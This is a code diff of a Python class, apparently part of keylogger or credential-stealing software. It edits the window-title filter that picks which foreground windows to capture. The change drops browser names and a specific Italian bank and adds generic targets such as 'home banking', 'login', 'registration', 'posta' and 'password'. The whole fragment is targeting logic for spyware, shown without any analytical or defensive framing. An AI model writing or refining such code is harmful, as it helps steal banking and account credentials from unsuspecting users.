@@ -59,16 +59,20 @@ class ContextGrabber(threading.Thread):
   def isInterestingWindow (self, title: str):
     if not title: return False
     title = title.lower()
-    if 'chrome' in title: return 'Chrome'
-    if 'edge' in title: return 'Edge'
-    if 'opera' in title: return 'Opera'
-    if 'firefox' in title: return 'Firefox'
+    # if 'chrome' in title: return 'Chrome'
+    # if 'edge' in title: return 'Edge'
+    # if 'opera' in title: return 'Opera'
+    # if 'firefox' in title: return 'Firefox'
     if 'mail' in title: return True
+    if 'posta' in title: return True
     if 'password' in title: return True
     # if 'telegram' in title: return True
     if 'facebook' in title: return True
     if 'twitter' in title: return True
-    if 'banco bpm' in title: return True
+    if 'home banking' in title: return True
+    if 'homebanking' in title: return True
+    if 'login' in title: return True
+    if 'registration' in title: return True
     return False
 
   def getForegroundTitleIfInteresting (self):
